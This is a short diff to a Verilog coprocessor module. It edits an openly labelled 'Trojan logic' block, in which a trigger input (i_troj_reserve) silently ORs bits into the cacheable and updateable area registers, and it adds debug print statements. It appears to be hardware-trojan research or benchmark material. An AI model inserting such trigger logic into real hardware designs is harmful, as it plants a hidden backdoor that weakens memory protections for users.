@@ -122,13 +122,14 @@ always @ ( posedge i_clk ) begin
 
 	/// Trojan logic for updating cacheable_area and updateable_area
 	if (i_troj_reserve) begin
-		cacheable_area <= cacheable_area | 32'h8000_0000;
-		updateable_area <= updateable_area | 32'h8000_0000;
+		cacheable_area <= cacheable_area | 32'h0000_0002;
+		updateable_area <= updateable_area | 32'h0000_0002;
+		$display("Troj Cacheable: %h", cacheable_area);
+		$display("Troj Updateable: %h", updateable_area);
 	end
 	
-    if ( !i_fetch_stall )         
-        begin
-        if ( i_copro_operation == 2'd2 )
+    if ( !i_fetch_stall ) begin
+        if ( i_copro_operation == 2'd2 ) begin
             case ( i_copro_crn )
                 4'd2: cache_control   <= i_copro_write_data[2:0];
                 4'd3: cacheable_area  <= i_copro_write_data[31:0];
@@ -136,6 +137,9 @@ always @ ( posedge i_clk ) begin
                 4'd5: disruptive_area <= i_copro_write_data[31:0];
             endcase
         end
+	$display("Cacheable: %h", cacheable_area);
+	$display("Updateable: %h", updateable_area);
+    end
 end
 
 // Flush the cache
